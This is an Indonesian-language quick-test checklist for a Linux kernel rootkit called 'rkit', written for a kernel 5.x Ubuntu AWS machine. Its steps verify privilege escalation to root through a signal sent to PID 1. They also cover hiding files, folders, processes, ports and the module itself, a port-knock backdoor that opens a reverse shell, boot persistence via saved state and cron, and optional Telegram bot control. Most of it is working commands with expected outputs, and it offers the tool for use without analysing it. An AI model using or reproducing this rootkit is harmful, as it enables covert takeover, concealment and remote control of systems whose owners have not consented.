# =============================================
#  UJI CEPAT ROOTKIT — CLI (backend modern, kernel 5.x)
# =============================================
#  Mesin : Ubuntu AWS, kernel 5.11.0-1021-aws
#  Repo  : /rootkit   (CLI: /rootkit/control/cli/rkit)
#  Mode  : SEMUA sebagai root; siapkan `dmesg -w` di terminal lain
#
#  Status: backend modern = 🧪 (build+load lolos) — semua langkah
#          di bawah WAJIB lolos sebelum status naik jadi ✅
#          (bukti dicatat di docs/KERNEL_COMPAT.md)
# =============================================

1. STATUS AWAL
   /rootkit/control/cli/rkit status

2. LPE — dari user biasa
   runuser -u nobody -- sh -c 'kill -s 63 1 && id'
   -> diharapkan: uid=0(root) + dmesg "root diberikan ke pid ..."

3. HIDE FILE (by nama persis)
   touch /tmp/tesrahasia.txt
   ls /tmp | grep tesrahasia                     # TERLIHAT
   /rootkit/control/cli/rkit hide file tesrahasia.txt
   ls /tmp | grep tesrahasia                     # KOSONG (tersembunyi)
   ls -la /tmp/tesrahasia.txt                    # path langsung tetap jalan (batas v1)
   /rootkit/control/cli/rkit unhide file tesrahasia.txt

3b. HIDE FOLDER (mekanisme SAMA — filter nama entri, berlaku file ATAU folder;
    nama CLI tetap "file" karena targetnya = nama, bukan jenis)
    mkdir /tmp/rahasia-folder
    ls -d /tmp/rahasia-folder                     # TERLIHAT
    /rootkit/control/cli/rkit hide file rahasia-folder
    ls /tmp | grep rahasia-folder                 # KOSONG (folder tersembunyi)
    ls -d /tmp/rahasia-folder                     # path langsung tetap jalan (batas v1)
    /rootkit/control/cli/rkit unhide file rahasia-folder

4. HIDE PID
   sleep 600 &
   SP=$!
   /rootkit/control/cli/rkit hide pid $SP
   ps aux | grep -w $SP | grep -v grep           # KOSONG
   /rootkit/control/cli/rkit unhide pid $SP
   kill $SP
   # catatan: hidepid TIDAK ikut reboot (PID berubah) — untuk re-hide otomatis
   # tiap boot pakai tools/rkit-rehide.sh (pola proses -> pgrep -> hide)

5. HIDE PORT (koneksi)
   python3 -m http.server 8080 &
   /rootkit/control/cli/rkit hide port 8080
   netstat -tlnp | grep 8080                     # KOSONG
   ss -tlnp | grep 8080                          # CATAT hasilnya: mungkin masih terlihat
                                                 # (netlink = batas jujur terdokumentasi)
   /rootkit/control/cli/rkit unhide port 8080
   pkill -f 'http.server 8080'

6. SELF-HIDE MODUL — urutan WAJIB
   /rootkit/control/cli/rkit hide mod
   lsmod | grep rkit                             # KOSONG
   /rootkit/control/cli/rkit unhide mod          # ⚠️ WAJIB sebelum rmmod!
   lsmod | grep rkit                             # muncul lagi
   (lupa unhide -> rmmod gagal "not currently loaded" -> harus reboot)

7. UNLOAD BERSIH
   rmmod rkit
   dmesg | tail -5                               # "dilepas/dipulihkan", TANPA OOPS

8. BACKDOOR — mati default (state normal)
   timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337' || echo "OK: NONAKTIF"

9. BACKDOOR — AKTIF (opt-in, reload dengan param)
   rmmod rkit
   insmod /rootkit/backend/modern_5x_6x/kernel/rkit.ko backdoor_ip=127.0.0.1 backdoor_port=4444 knock_port=1337
   # terminal A :  nc -l 4444
   # terminal B :  timeout 3 bash -c 'echo knock > /dev/tcp/127.0.0.1/1337'
   -> shell masuk di A -> ketik id
   (throttle: knock ke-2 dalam 5 dtk diabaikan = hanya 1 shell)

10. STATE + REBOOT (persistensi boot)
    /rootkit/control/cli/rkit hide file bintang.txt
    cat /var/lib/rkit/state                      # ada baris: name bintang.txt
    reboot
    /rootkit/control/cli/rkit status             # daftar masih ada = boot-restore OK
    lsmod | grep rkit                            # modul hidup lagi tanpa intervensi

11. TELEGRAM (opsional — di mesin ini /hide bot aktif penuh, ada /proc/rkit)
    cd /rootkit && cp config.example.ini config.ini   # isi token + chat id + CONTROL_MODE=telegram
    sudo bash install.sh                              # daemon start + cron @reboot

12. PASCA-UJI (bersih-bersih)
    /rootkit/control/cli/rkit unhide file bintang.txt
    rmmod rkit
    dmesg | grep -iE 'oops|BUG:' | tail -5       # harus KOSONG

# =============================================
#  SELESAI
# =============================================
#  Catatan jujur (batas desain v1):
#   - akses path langsung selalu tembus (file tersembunyi tetap bisa
#     dibuka via path penuh; ps -p <pid> tetap menemukan pid tersembunyi)
#   - ss (netlink) bisa tetap melihat port yang disembunyikan dari netstat
#   - backend LEGACY (2.6-4.19): TIDAK punya /proc/rkit & CLI — kontrol via
#       kill -s 63 1  -> LPE
#       kill -s 64 1  -> hide modul      kill -s 62 1 -> tampilkan modul
#       insmod ... hide=".nama" hidepid="<pid>" hideport="<port>"
#   - semua baris status: docs/KERNEL_COMPAT.md — naikkan HANYA setelah lolos
# =============================================
